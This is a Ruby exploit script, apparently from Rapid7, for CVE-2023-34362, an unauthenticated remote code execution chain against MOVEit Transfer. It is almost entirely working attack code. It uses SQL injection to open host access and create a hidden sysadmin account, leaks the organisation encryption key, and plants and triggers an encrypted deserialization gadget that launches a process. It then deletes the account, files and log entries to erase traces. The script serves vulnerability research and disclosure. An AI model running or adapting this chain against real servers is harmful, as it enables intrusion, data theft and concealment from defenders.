# CVE-2023-34362: MOVEit Transfer Unauthenticated RCE
#
# AttackerKB Analysis: https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis
#
# Usage: ruby CVE-2023-34362.rb <TARGET_IP>
#
# Note: the deserialization gadget is configured to spawn 'notepad.exe'.
#
# Credits: rbowes-r7 & cfielding-r7 (SQLi), sfewer-r7 (RCE)

require 'httparty'
require 'digest'
require 'openssl'

TARGET = "https://#{ARGV[0] || '10.0.0.193'}"

VERBOSE = false

# This is required because Ruby messes with header case, and this software cares
HEADERS = [
    'X-siLock-AgentBrand', 'X-siLock-AgentVersion', 'X-siLock-CanAcceptCompress', 'X-siLock-CanAcceptLumps', 'X-siLock-CanCheckHash',
    'X-siLock-Challenge', 'X-siLock-CheckVirus', 'X-siLock-ClientType', 'X-siLock-CS2-Allow204', 'X-siLock-CS2-AVDLP',
    'X-siLock-CS2-BlockOnError', 'X-siLock-CS2-ChunkSizeKB', 'X-siLock-CS2-ConnTimeoutSecs', 'X-siLock-CS2-DoPreview', 'X-siLock-CS2-Engine',
    'X-siLock-CS2-Error', 'X-siLock-CS2-ISTag', 'X-siLock-CS2-MaxFileSize', 'X-siLock-CS2-Name', 'X-siLock-CS2-RecvTimeoutSecs',
    'X-siLock-CS2-SendTimeoutSecs', 'X-siLock-CS2-Tries', 'X-siLock-CS2-Type', 'X-siLock-CS2-URL', 'X-siLock-CS-Allow204',
    'X-siLock-CS-AVDLP', 'X-siLock-CS-BlockOnError', 'X-siLock-CS-ChunkSizeKB', 'X-siLock-CS-ConnTimeoutSecs', 'X-siLock-CS-DoPreview',
    'X-siLock-CS-Engine', 'X-siLock-CS-Error', 'X-siLock-CS-ISTag', 'X-siLock-CS-MaxFileSize', 'X-siLock-CS-Name',
    'X-siLock-CS-RecvTimeoutSecs', 'X-siLock-CSRFToken', 'X-siLock-CS-SendTimeoutSecs', 'X-siLock-CS-Tries', 'X-siLock-CS-URL',
    'X-siLock-DLPChecked', 'X-siLock-DLPViolation', 'X-siLock-DownloadToken', 'X-siLock-Duration', 'X-siLock-ErrorCode',
    'X-siLock-ErrorDescription', 'X-siLock-FileID', 'X-siLock-FileIDToDelete', 'X-siLock-FilePath', 'X-siLock-FileSize',
    'X-siLock-FolderID', 'X-siLock-FolderPath', 'X-siLock-FolderType', 'X-siLock-Hash', 'X-siLock-HashOK',
    'X-siLock-InstID', 'X-siLock-IntegrityVerified', 'X-siLock-IPAddress', 'X-siLock-LangCode', 'X-siLock-LoginName',
    'X-siLock-LogRecID', 'X-siLock-MailboxOwner', 'X-siLock-NotificationID', 'X-siLock-OriginalFilename', 'X-siLock-PackageID',
    'X-siLock-PartialFileID', 'X-siLock-PartialFilePath', 'X-siLock-Password', 'X-siLock-RealName', 'X-siLock-RelativePath',
    'X-siLock-ResumeInPlace', 'X-siLock-SessionID', 'X-siLock-SessVar', 'X-siLock-TimeBegun', 'X-siLock-TimeElapsed',
    'X-siLock-TimeEnded', 'X-siLock-Transaction', 'X-siLock-Untrusted', 'X-siLock-UploadComment', 'X-siLock-UserFilename',
    'X-siLock-Username', 'X-siLock-VirusChecked', 'X-siLock-XferFormat',
]

def log(msg)
    $stdout.puts("[+] #{msg}\n\n")
end

def rand_string(len)
    (0...len).map { (65 + rand(26)).chr }.join
end

# Override the capitalize function to prevent Ruby from changing the case
# incorrectly
module Net::HTTPHeader
    def capitalize(name)
        name = name.split(/-/).map {|s| s.capitalize }.join('-')

        # Fix the case on headers, because Ruby
        HEADERS.each do |h|
            name = name.gsub(/#{ h }/i, h)
        end

        return name
    end
    private :capitalize
end

# Parse a request to find a CSRF token (this is pretty naive but works)
def get_csrf_token(r)
    if r.split(/\n/).join() =~ /.*csrftoken" value="([a-f0-9]*)"/
        return $1
    else
        puts r if VERBOSE
        raise 'No csrf token, or my code is bad'
    end
end

# Perform a request to the ISAPI endpoint with an arbitrary transaction
def isapi_request(cookies, transaction, headers)
    return HTTParty.get(
        "#{TARGET}/moveitisapi/moveitisapi.dll?action=m2",
        verify: false,
        headers: {
            'Cookie' => cookies,
            'X-siLock-Test': 'abcdX-SILOCK-Transaction: folder_add_by_path',
            'X-siLock-Transaction': transaction,
        }.merge(headers),
    )
end

# Perform a request to the guestaccess.aspx endpoint with cookies
def guestaccess_request(cookies, body)
    return HTTParty.post(
        "#{TARGET}/guestaccess.aspx",
        verify: false,
        headers: {
            'Cookie' => cookies,
        },
        follow_redirects: false,
        body: body,
    )
end

# Set a session variable by leveraging the header-confusing issue
def set_session(token, h)
    sessvars = {}
    sessIdx = 0
    h.each_pair do |k, v|
        puts "* Setting #{k} => #{v}" if VERBOSE
        sessvars.store("X-siLock-SessVar#{sessIdx}", "#{ k }: #{ v }")
        sessIdx += 1
    end
    isapi_request(token, 'session_setvars', sessvars).headers
end

MYGUESTEMAILADDR = "#{rand_string(8)}@#{rand_string(8)}.com"

# Perform unauthenticated SQLi
def sqli(cookies, sql_payload)
    # Set up a fake package in the session. The order here is important. We set these session variables one per request,
    # so first set the package information, then switch over to a 'Guest' username to allow the CSRF/injection to work as
    # expected. If we dont do this order the session will be cleared and the injection will not work.
    set_session(cookies, {
        'MyPkgAccessCode'            => 'accesscode', # Must match the final request Arg06
        'MyPkgID'                    => '0', # Is self provisioned? (must be 0)
        'MyGuestEmailAddr'           => MYGUESTEMAILADDR, # Must be a valid email address @ MOVEit.DMZ.ClassLib.dll/MOVEit.DMZ.ClassLib/MsgEngine.cs
        'MyPkgInstID'                => '1234', # this can be any int value
        'MyPkgSelfProvisionedRecips' => sql_payload,
        'MyUsername'                 => 'Guest',
    })

    # Get a CSRF token - this has to be *after* you set MyUsername, since the
    # username is incorporated into it
    #
    # Transaction => request type, different types will work
    # Arg06 => the package access code (must match what's set above)
    # Arg12 => promptaccesscode requests a form, which contains a CSRF code
    puts if VERBOSE
    puts "Getting CSRF token from guestaccess.aspx..." if VERBOSE
    csrf = get_csrf_token(guestaccess_request(cookies, 'Transaction=dummy&Arg06=accesscode&Arg12=promptaccesscode'))
    puts "CSRF token = #{csrf}" if VERBOSE

    # This does the actual injection
    puts if VERBOSE
    puts "Triggering the payload via guestaccess.aspx..." if VERBOSE
    guestaccess_request(cookies, "Arg06=accesscode&transaction=secmsgpost&Arg01=subject&Arg04=body&Arg05=sendauto&Arg09=pkgtest9&csrftoken=#{csrf}")
end

# Generate an SQLi payload, pass in an array os SQL statements to execute.
def get_sqli_payload(sql_payload)
    # Create the initial injection, and create the session object
    payload = [
        # The initial injection
        "#{rand_string(8)}@#{rand_string(8)}.com')",
    ].concat(sql_payload)

    # Join our payload, and terminate with a comment character
    return payload.join(';') + ';#'
end

# We gen a v1 password as we cannot know the Org key bytes to gen a v2/v3/v4 password. We
# can later leak the Org Key, after we gen a sysadmin account and get an API token.
def makev1password(password, salt='AAAA')

    raise "password cannot be empty" if password.empty?

    raise "salt must be 4 bytes" if salt.length != 4

    # These two hardcoded values are found in MOVEit.DMZ.Core.Cryptography.Providers.SecretProvider.GetSecret
    pwpre = Base64.decode64('=VT2jkEH3vAs=')

    pwpost = Base64.decode64('=0maaSIA5oy0=')

    md5 = Digest::MD5.new
    md5.update(pwpre)
    md5.update(salt)
    md5.update(password)
    md5.update(pwpost)

    pw = [(4+4+16), 0, 0, 0].pack('CCCC')
    pw << salt
    pw << md5.digest

    return Base64.strict_encode64(pw).gsub('+','-')
end

def moveitv2encrypt(data, org_key, iv=nil, tag='@%!')

    raise "org_key must be 16 bytyes" if org_key.length != 16

    if iv.nil?
        iv = rand_string(4)
        # as we only store the first 4 bytes in the header, the IV must be a repeating 4 byte sequence.
        iv = iv * 4
    end

    # MOVEit.DMZ.Core.Cryptography.Encryption
    key = [64, 131, 232, 51, 134, 103, 230, 30, 48, 86, 253, 157].pack('C*')

    key = key + org_key

    key = key + [0, 0, 0, 0].pack('C*')

    # MOVEit.Crypto.AesMOVEitCryptoTransform
    cipher = OpenSSL::Cipher.new('AES-256-CBC')

    cipher.encrypt

    cipher.key = key

    cipher.iv = iv

    encrypted_data = cipher.update(data) + cipher.final

    data_sha1_hash = Digest::SHA1.digest(data).unpack('C*')

    org_key_sha1_hash = Digest::SHA1.digest(org_key).unpack('C*')

    # MOVEit.DMZ.Core.Cryptography.Providers.MOVEit.MOVEitV2EncryptedStringHeader
    header = [
        225, # MOVEitV2EncryptedStringHeader
        0,
        data_sha1_hash[0],
        data_sha1_hash[1],
        org_key_sha1_hash[0],
        org_key_sha1_hash[1],
        org_key_sha1_hash[2],
        org_key_sha1_hash[3],
        iv.unpack('C*')[0],
        iv.unpack('C*')[1],
        iv.unpack('C*')[2],
        iv.unpack('C*')[3],
    ].pack('C*')

    # MOVEit.DMZ.Core.Cryptography.Encryption
    return tag + Base64.strict_encode64(header + encrypted_data)
end

log("Starting. target='#{TARGET}'.")

# Get an initial ASP.NET_SessionId token and also a siLockLongTermInstID.
puts "Getting a session cookie..." if VERBOSE

r = HTTParty.get("#{TARGET}/", verify: false)

cookies = r.get_fields('Set-Cookie').join('; ')

puts "Cookies = #{cookies}" if VERBOSE

# Get the session id from the cookies
if cookies =~ /ASP.NET_SessionId=([a-z0-9]+);/
    token = $1
else
    raise "Couldn't find token from cookies!"
end

# Get the InstID from the cookies
if cookies =~ /siLockLongTermInstID=([0-9]+);/
    instid = $1
else
    raise "Couldn't find InstID from cookies!"
end

log("Retrieved initial session token '#{token}' and InstID '#{instid}'.")

#
# STEP 1: Allow Remote Access
# STEP 2: Create a sysadmin
#

hax_username = rand_string(8)
hax_loginname = rand_string(8)
hax_password = rand_string(8)

createuser_payload = [

    "UPDATE moveittransfer.hostpermits SET Host='*.*.*.*' WHERE Host!='*.*.*.*'",

    "INSERT INTO moveittransfer.users (Username) VALUES ('#{hax_username}')",

    "UPDATE moveittransfer.users SET LoginName='#{hax_loginname}' WHERE Username='#{hax_username}'",

    "UPDATE moveittransfer.users SET InstID='#{instid}' WHERE Username='#{hax_username}'",

    "UPDATE moveittransfer.users SET Password='#{makev1password(hax_password, rand_string(4))}' WHERE Username='#{hax_username}'",

    "UPDATE moveittransfer.users SET Permission='40' WHERE Username='#{hax_username}'",

    "UPDATE moveittransfer.users SET CreateStamp=NOW() WHERE Username='#{hax_username}'",
]

log("Creating new sysadmin account: username='#{hax_username}', userlogin='#{hax_loginname}', password='#{hax_password}'.")

res = sqli(cookies, get_sqli_payload(createuser_payload))

if res.code != 200
    raise "Couldn't perform initial SQLi (#{res.body})"
end

#
# STEP 3: Get an API Token
#

token_response = HTTParty.post(
    "#{TARGET}/api/v1/token",
    verify: false,
    headers: {
        'Content-Type' => 'application/x-www-form-urlencoded',
    },
    follow_redirects: false,
    body: "grant_type=password&username=#{hax_loginname}&password=#{hax_password}",
)

if token_response.code != 200
    raise "Couldn't get API token (#{token_response.body})"
end

token_json = JSON.parse(token_response.body)

log("Got API access token='#{token_json['access_token']}'.")

#
# STEP 4: Find a Folder ID
#

folders_response = HTTParty.get(
    "#{TARGET}/api/v1/folders",
    verify: false,
    headers: {
        'Authorization' => "Bearer #{token_json['access_token']}",
    },
    follow_redirects: false,
)

if folders_response.code != 200
    raise "Couldn't get API folders (#{folders_response.body})"
end

folders_json = JSON.parse(folders_response.body)

log("Found folderId '#{folders_json['items'][0]['id']}'.")

#
# STEP 5: Begin a Resumable File Upload
#

uploadfile_name = rand_string(8)
uploadfile_size = 8
uploadfile_data = rand_string(uploadfile_size)

files_response = HTTParty.post(
    "#{TARGET}/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable",
    verify: false,
    headers: {
        'Authorization' => "Bearer #{token_json['access_token']}",
    },
    follow_redirects: false,
    multipart: true,
    body: {
        name: uploadfile_name,
        size: (uploadfile_size).to_s,
        comments: ''
    }
)

if files_response.code != 200
    raise "Couldn't post API files #1 (#{files_response.body})"
end

files_json = JSON.parse(files_response.body)

log("Initiated resumable file upload for fileId '#{files_json['fileId']}'...")

#
# STEP 6: Leak the Encryption Key
#

haxleak_payload = [

    # The \ gets escaped, so we leverage CHAR_LENGTH(39) to get the key we want (Standard Networks\siLock\Institutions\0) as all other KeyName's will be longer (Standard Networks\siLock\Institutions\1234)
    "UPDATE moveittransfer.files SET UploadAgentBrand=(SELECT PairValue FROM moveittransfer.registryaudit WHERE PairName='Key' AND CHAR_LENGTH(KeyName)=#{'Standard Networks\siLock\Institutions\0'.length}) WHERE ID='#{files_json['fileId']}'"
]

sqli(cookies, get_sqli_payload(haxleak_payload))

leak_response = HTTParty.get(
    "#{TARGET}/api/v1/files/#{files_json['fileId']}",
    verify: false,
    headers: {
        'Authorization' => "Bearer #{token_json['access_token']}",
    },
    follow_redirects: false,
)

if leak_response.code != 200
    raise "Couldn't post API files #LEAK (#{leak_response.body})"
end

leak_json = JSON.parse(leak_response.body)

org_key = leak_json['uploadAgentBrand']

log("Leaked the Org Key: #{org_key}")

#
# STEP 7: Encrypt a Deserialization Gadget
#

# https://github.com/pwntester/ysoserial.net
# ysoserial.net>ysoserial.exe --command=notepad.exe -o base64 -f BinaryFormatter -g TextFormattingRunProperties
gadget = "AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAugU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIG5vdGVwYWQuZXhlIiBTdGFuZGFyZEVycm9yRW5jb2Rpbmc9Int4Ok51bGx9IiBTdGFuZGFyZE91dHB1dEVuY29kaW5nPSJ7eDpOdWxsfSIgVXNlck5hbWU9IiIgUGFzc3dvcmQ9Int4Ok51bGx9IiBEb21haW49IiIgTG9hZFVzZXJQcm9maWxlPSJGYWxzZSIgRmlsZU5hbWU9ImNtZCIgLz4NCiAgICAgIDwvc2Q6UHJvY2Vzcy5TdGFydEluZm8+DQogICAgPC9zZDpQcm9jZXNzPg0KICA8L09iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCjwvT2JqZWN0RGF0YVByb3ZpZGVyPgs="

log("Using deserialization gadget: #{gadget}")

org_key.gsub!(' ', '')

org_key = [org_key].pack('H*').bytes.to_a.pack('C*')

deserialization_gadget = moveitv2encrypt(gadget, org_key)

log("Encrypted the gadget with Org Key: #{deserialization_gadget}")

#
# STEP 8: Plant the Gadget
#

haxupload_payload = [

    "UPDATE moveittransfer.fileuploadinfo SET State='#{deserialization_gadget}' WHERE FileID='#{files_json['fileId']}'",
]

log("Planting encrypted gadget into the DB...")

sqli(cookies, get_sqli_payload(haxupload_payload))

#
# STEP 9: Unsafe Deserialization
#

p "uploading fileid #{files_json['fileId']} to folderid #{folders_json['items'][0]['id']}" if VERBOSE

log("Triggering gadget deserialization...")

files_response = HTTParty.put(
    "#{TARGET}/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable&fileId=#{files_json['fileId']}",
    verify: false,
    headers: {
        'Authorization' => "Bearer #{token_json['access_token']}",
        'Content-Type' => "application/octet-stream",
        'Content-Range' => "bytes 0-#{uploadfile_size-1}/#{uploadfile_size}",
        'X-File-Hash' => Digest::SHA1.hexdigest(uploadfile_data),
    },
    follow_redirects: false,
    body: uploadfile_data[0,uploadfile_data.length]
)

# 500 if payload runs :)
if files_response.code != 500
    raise "Couldn't post API files #2 code=#{files_response.code} (#{files_response.body})"
end

log("Gadget deserialized, RCE Achieved!")

p files_response.body if VERBOSE

#
# STEP 10: Delete the IoCâ€™s
#

deleteuser_payload = [

    "DELETE FROM moveittransfer.fileuploadinfo WHERE FileID='#{files_json['fileId']}'", # delete the deserialization payload

    "DELETE FROM moveittransfer.files WHERE UploadUsername='#{hax_username}'", # delete the file we uploaded

    "DELETE FROM moveittransfer.activesessions WHERE Username='#{hax_username}'", #

    "DELETE FROM moveittransfer.users WHERE Username='#{hax_username}'", # delete the user account we created

    "DELETE FROM moveittransfer.log WHERE Username='#{hax_username}'", # The web ASP stuff logs by username

    "DELETE FROM moveittransfer.log WHERE Username='#{hax_loginname}'", # The API logs by loginname

    "DELETE FROM moveittransfer.log WHERE Username='Guest:#{MYGUESTEMAILADDR}'", # The SQLi generates a guest log entry.
]

log("Deleating IoC's from the DB...")

sqli(cookies, get_sqli_payload(deleteuser_payload))

log("Finished.")